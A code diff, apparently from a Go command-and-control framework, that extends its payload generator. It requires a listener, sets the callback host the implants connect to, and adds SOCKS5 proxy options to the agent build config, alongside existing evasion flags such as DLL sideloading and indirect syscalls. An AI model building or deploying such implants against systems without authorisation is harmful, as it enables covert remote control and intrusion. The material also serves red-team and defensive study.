@@ -26,6 +26,8 @@ type PayloadConfig struct {
 	DllSideloading  bool   `json:"dllSideloading"`
 	SideloadDll     string `json:"sideloadDll,omitempty"`
 	ExportName      string `json:"exportName,omitempty"`
+	Socks5Enabled   bool   `json:"socks5_enabled"`
+	Socks5Port      int    `json:"socks5_port"`
 }
 
 // PayloadResult contains information about a generated payload
@@ -110,6 +112,13 @@ func (h *PayloadHandler) HandleGeneratePayload(w http.ResponseWriter, r *http.Re
 	var config PayloadConfig
 	if err := json.NewDecoder(r.Body).Decode(&config); err != nil {
 		http.Error(w, "Invalid request body", http.StatusBadRequest)
+		return
+	}
+
+	// Enforce listener selection
+	if config.ListenerID == "" {
+		http.Error(w, "Listener selection is required. You must select a listener for agent communication.", http.StatusBadRequest)
+		log.Printf("[ERROR] Payload generation aborted: no listener selected.")
 		return
 	}
 
@@ -202,6 +211,9 @@ func (h *PayloadHandler) GeneratePayload(config PayloadConfig) (PayloadResult, e
 		log.Printf("[ERROR] Failed to get listener %s: %v", config.ListenerID, err)
 		return PayloadResult{}, fmt.Errorf("failed to get listener: %w", err)
 	}
+	if listener.Port == 8080 {
+		log.Printf("[WARNING] Listener port is 8080 (web server port). This is not recommended for agent communication.")
+	}
 	log.Printf("[INFO] Using listener: %s (%s) at %s:%d", listener.Name, listener.Protocol, listener.BindHost, listener.Port)
 
 	// Use listener ID for the payload
@@ -226,17 +238,20 @@ func (h *PayloadHandler) GeneratePayload(config PayloadConfig) (PayloadResult, e
 	// Create agent config file
 	configPath := filepath.Join(outputDir, "config.json")
 
-	// Determine the protocol prefix and full server URL
+	// Determine the protocol prefix
 	protocolPrefix := "http://"
 	if listener.Protocol == "https" {
 		protocolPrefix = "https://"
 	}
 
-	// Use BindHost by default, override with the first entry in Hosts if provided
-	serverUrl := fmt.Sprintf("%s%s:%d", protocolPrefix, listener.BindHost, listener.Port)
+	// Choose the advertised host: prefer Hosts[0] if set, else BindHost
+	var connectHost string
 	if len(listener.Hosts) > 0 {
-		serverUrl = fmt.Sprintf("%s%s:%d", protocolPrefix, listener.Hosts[0], listener.Port)
+		connectHost = listener.Hosts[0]
+	} else {
+		connectHost = listener.BindHost
 	}
+	serverUrl := fmt.Sprintf("%s%s:%d", protocolPrefix, connectHost, listener.Port)
 
 	agentConfig := map[string]interface{}{
 		"server_url":     serverUrl,
@@ -244,6 +259,13 @@ func (h *PayloadHandler) GeneratePayload(config PayloadConfig) (PayloadResult, e
 		"jitter":         2,           // Default jitter value
 		"payload_id":     listener.ID, // Use listener ID as payload ID
 		"protocol":       listener.Protocol,
+	}
+
+	// Include SOCKS5 proxy settings if requested
+	agentConfig["socks5_enabled"] = config.Socks5Enabled
+	agentConfig["socks5_port"] = config.Socks5Port
+	if config.Socks5Enabled {
+		agentConfig["protocol"] = "socks5"
 	}
 
 	// Add additional configuration options based on payload settings
@@ -300,7 +322,16 @@ func (h *PayloadHandler) GeneratePayload(config PayloadConfig) (PayloadResult, e
 	log.Printf("[INFO] Using build script: %s", buildScript)
 
 	// Set up the command
-	cmdArgs := []string{buildScript, "--target", buildTarget, "--output", outputDir, "--build-type", buildType, "--format", config.Format, "--payload-id", payloadID}
+	cmdArgs := []string{
+		buildScript,
+		"--target", buildTarget,
+		"--output", outputDir,
+		"--build-type", buildType,
+		"--format", config.Format,
+		"--payload-id", payloadID,
+		"--listener-host", connectHost, // Use advertised host for build args
+		"--listener-port", fmt.Sprintf("%d", listener.Port),
+	}
 
 	// Add additional build arguments based on configuration
 	if config.IndirectSyscall {
@@ -333,12 +364,15 @@ func (h *PayloadHandler) GeneratePayload(config PayloadConfig) (PayloadResult, e
 		fmt.Sprintf("TARGET=%s", buildTarget),
 		fmt.Sprintf("OUTPUT_DIR=%s", outputDir),
 		fmt.Sprintf("BUILD_TYPE=%s", buildType),
-		fmt.Sprintf("LISTENER_HOST=%s", listener.BindHost),
+		fmt.Sprintf("LISTENER_HOST=%s", connectHost),
 		fmt.Sprintf("LISTENER_PORT=%d", listener.Port),
 		fmt.Sprintf("SLEEP_INTERVAL=%d", config.Sleep),
+		fmt.Sprintf("SOCKS5_ENABLED=%t", config.Socks5Enabled),
+		fmt.Sprintf("SOCKS5_PORT=%d", config.Socks5Port),
 	)
-	log.Printf("[INFO] Environment variables set: TARGET=%s, OUTPUT_DIR=%s, BUILD_TYPE=%s, LISTENER_HOST=%s, LISTENER_PORT=%d, SLEEP_INTERVAL=%d",
-		buildTarget, outputDir, buildType, listener.BindHost, listener.Port, config.Sleep)
+
+	log.Printf("[INFO] Environment variables set: TARGET=%s, OUTPUT_DIR=%s, BUILD_TYPE=%s, SLEEP_INTERVAL=%d, SOCKS5_ENABLED=%t, SOCKS5_PORT=%d",
+		buildTarget, outputDir, buildType, config.Sleep, config.Socks5Enabled, config.Socks5Port)
 
 	log.Printf("[INFO] Starting build process...")
 	// Execute build command
@@ -359,15 +393,10 @@ func (h *PayloadHandler) GeneratePayload(config PayloadConfig) (PayloadResult, e
 
 	// Log the first few lines of the output and summarize the rest
 	outputLines := strings.Split(string(output), "\n")
-	maxLogLines := 10
-	for i, line := range outputLines {
+	// Log ALL lines, not just the first 10
+	for _, line := range outputLines {
 		if line != "" {
-			if i < maxLogLines {
-				log.Printf("[INFO] Build output: %s", line)
-			} else {
-				log.Printf("[INFO] Skipping remaining %d lines of output...", len(outputLines)-maxLogLines)
-				break
-			}
+			log.Printf("[INFO] Build output: %s", line)
 		}
 	}
 
